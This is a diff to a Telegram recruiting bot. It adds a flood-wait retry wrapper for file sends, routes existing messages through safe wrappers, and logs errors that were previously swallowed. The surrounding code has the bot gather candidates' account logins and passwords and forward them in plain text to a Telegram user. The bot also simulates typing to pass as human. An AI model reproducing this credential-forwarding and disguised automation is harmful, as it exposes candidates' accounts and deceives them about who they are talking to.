@@ -49,6 +49,19 @@ async def _send_message_safe(peer, text, **kwargs):
         return await client.send_message(peer, text, **kwargs)
 
 
+async def _send_file_safe(peer, path, **kwargs):
+    """Аналог _send_message_safe для send_file - раньше в hr-bot отсутствовала
+    (была только в brosky-bot), при ревью после T1-T12 найдена как реальный
+    пробел: отправка файла-задания в _do_process/_patrol_respond оставалась
+    сырой при том, что соседний текстовый ответ уже был защищён."""
+    try:
+        return await client.send_file(peer, path, **kwargs)
+    except FloodWaitError as e:
+        logging.warning(f"FloodWait {e.seconds}с при отправке файла {peer}, жду и повторяю")
+        await asyncio.sleep(e.seconds)
+        return await client.send_file(peer, path, **kwargs)
+
+
 SIGNAL_PATTERN = re.compile(r">>>\s*СИГНАЛ МЕНЕДЖЕРУ:\s*(.+?)<<<", re.DOTALL)
 FILE_PATTERN = re.compile(r">>>\s*ОТПРАВИТЬ_ФАЙЛ:\s*(\S+)\s*<<<")
 ANKETA_PATTERN = re.compile(r">>>\s*АНКЕТА:\s*(.+?)<<<", re.DOTALL)
@@ -239,7 +252,7 @@ def parse_anketa_fallback(text):
 async def send_signal(text):
     try:
         manager = await client.get_entity(MANAGER_USERNAME)
-        await client.send_message(manager, text)
+        await _send_message_safe(manager, text)
     except Exception as e:
         logging.info(f"Failed to send signal: {e}")
 
@@ -337,12 +350,12 @@ async def handler(event):
             logging.error(f"Sheets creds error: {e}")
         confirm = f"Отлично, {name}! Данные получил, передам коллегам для настройки аккаунта."
         try:
-            await client.send_message(event.chat_id, confirm)
+            await _send_message_safe(event.chat_id, confirm)
             add_message(user_id, "bot", confirm)
-        except Exception:
-            pass
+        except Exception as e:
+            logging.warning(f"Creds confirm send error for {name}: {e}")
         try:
-            await client.send_message("mx_mish", f"🔑 Готов отдать аккаунт: {name} ({username})\nЛогин/пароль: {creds_str}")
+            await _send_message_safe("mx_mish", f"🔑 Готов отдать аккаунт: {name} ({username})\nЛогин/пароль: {creds_str}")
         except Exception as e:
             logging.error(f"Notify mx_mish error: {e}")
         logging.info(f"Кредсы получены от {name}: {login} / ***")
@@ -561,7 +574,7 @@ async def _do_process(user_id, username, name, chat_id, candidate):
     for file_name in files:
         path = os.path.join(os.path.dirname(__file__) or ".", file_name.strip())
         if os.path.exists(path):
-            await client.send_file(chat_id, path, caption="Вот задания в картинке, ссылка что-то барахлит.")
+            await _send_file_safe(chat_id, path, caption="Вот задания в картинке, ссылка что-то барахлит.")
 
     for anketa_raw in anketas:
         anketa = parse_anketa(anketa_raw)
@@ -663,24 +676,24 @@ async def reminder_loop():
                         continue
                     msg = f"{name}, напоминаю про задания для отбора. Когда планируете выполнить?"
                     try:
-                        await client.send_message(user_id, msg)
+                        await _send_message_safe(user_id, msg)
                         add_message(user_id, "bot", msg)
                         update_candidate(user_id, reminder_count=2, last_reminder=datetime.now().isoformat())
                         logging.info(f"Напоминание 2: {name}")
-                    except:
-                        pass
+                    except Exception as e:
+                        logging.warning(f"Reminder 2 send error for {name}: {e}")
                 elif hours >= 24 and count < 1:
                     status = c.get("status", "")
                     if status not in ("ТЕСТОВОЕ_ОТПРАВЛЕНО",):
                         continue
                     msg = f"{name}, как дела с заданиями? Если есть вопросы — пишите, помогу."
                     try:
-                        await client.send_message(user_id, msg)
+                        await _send_message_safe(user_id, msg)
                         add_message(user_id, "bot", msg)
                         update_candidate(user_id, reminder_count=1, last_reminder=datetime.now().isoformat())
                         logging.info(f"Напоминание 1: {name}")
-                    except:
-                        pass
+                    except Exception as e:
+                        logging.warning(f"Reminder 1 send error for {name}: {e}")
         except Exception as e:
             logging.error(f"Reminder error: {e}")
 
@@ -764,7 +777,7 @@ async def _process_one_decision(d):
             msg1 = f"{name}, посмотрел вашу визитку - реально понравилось. Видно что вы увлечены предметом и умеете подать себя. Именно такой подход мы и ищем."
             if not is_test_user:
                 await _simulate_typing(peer_id, len(msg1))
-            await client.send_message(peer, msg1)
+            await _send_message_safe(peer, msg1)
             add_message(user_id, "bot", msg1)
 
             if not is_test_user:
@@ -789,7 +802,7 @@ async def _process_one_decision(d):
             )
             if not is_test_user:
                 await _simulate_typing(peer_id, len(msg2))
-            await client.send_message(peer, msg2)
+            await _send_message_safe(peer, msg2)
             add_message(user_id, "bot", msg2)
 
             if not is_test_user:
@@ -801,7 +814,7 @@ async def _process_one_decision(d):
             msg3 = "Для обсуждения деталей и назначения созвона свяжитесь с моим коллегой - @brosky_manage. Он всё расскажет подробнее."
             if not is_test_user:
                 await _simulate_typing(peer_id, len(msg3))
-            await client.send_message(peer, msg3)
+            await _send_message_safe(peer, msg3)
             add_message(user_id, "bot", msg3)
             update_candidate(user_id, status="ПЕРЕДАН_МЕНЕДЖЕРУ")
             _folders.trigger_sync(_folder_event)
@@ -821,7 +834,7 @@ async def _process_one_decision(d):
             msg = f"{name}, спасибо что уделили время. К сожалению, на данном этапе не подходим друг другу - {reason_txt}. Удачи вам!"
             if not is_test_user:
                 await _simulate_typing(peer_id, len(msg))
-            await client.send_message(peer, msg)
+            await _send_message_safe(peer, msg)
             add_message(user_id, "bot", msg)
             update_candidate(user_id, status="ОТКАЗ")
             _folders.trigger_sync(_folder_event)
@@ -832,7 +845,7 @@ async def _process_one_decision(d):
             msg = f"{name}, для обсуждения деталей вас свяжу с коллегой. Напишите ему, пожалуйста: @brosky_manage"
             if not is_test_user:
                 await _simulate_typing(peer_id, len(msg))
-            await client.send_message(peer, msg)
+            await _send_message_safe(peer, msg)
             add_message(user_id, "bot", msg)
             update_candidate(user_id, status="ПЕРЕДАН_МЕНЕДЖЕРУ")
             update_status(username, "ПЕРЕДАН_МЕНЕДЖЕРУ", "Передан @brosky_manage")
@@ -1073,12 +1086,12 @@ async def patrol_loop():
                                 logging.error(f"[patrol] Sheets creds error: {e}")
                             try:
                                 confirm = f"Отлично! Данные получил, передам коллегам для настройки аккаунта."
-                                await client.send_message(user_id, confirm)
+                                await _send_message_safe(user_id, confirm)
                                 add_message(user_id, "bot", confirm)
-                            except Exception:
-                                pass
+                            except Exception as e:
+                                logging.warning(f"[patrol] Creds confirm send error for {name}: {e}")
                             try:
-                                await client.send_message("mx_mish", f"🔑 Готов отдать аккаунт: {name} ({c.get('username','')})\nЛогин/пароль: {creds_str}")
+                                await _send_message_safe("mx_mish", f"🔑 Готов отдать аккаунт: {name} ({c.get('username','')})\nЛогин/пароль: {creds_str}")
                             except Exception as e:
                                 logging.error(f"[patrol] Notify mx_mish error: {e}")
                             logging.info(f"[patrol] Кредсы от {name}: {login} / ***")
@@ -1173,7 +1186,7 @@ async def _patrol_respond(user_id, username, name, delay):
         for file_name in files:
             path = os.path.join(os.path.dirname(__file__) or ".", file_name.strip())
             if os.path.exists(path):
-                await client.send_file(user_id, path, caption="Вот задания в картинке, ссылка что-то барахлит.")
+                await _send_file_safe(user_id, path, caption="Вот задания в картинке, ссылка что-то барахлит.")
 
         for anketa_raw in anketas:
             anketa = parse_anketa(anketa_raw)
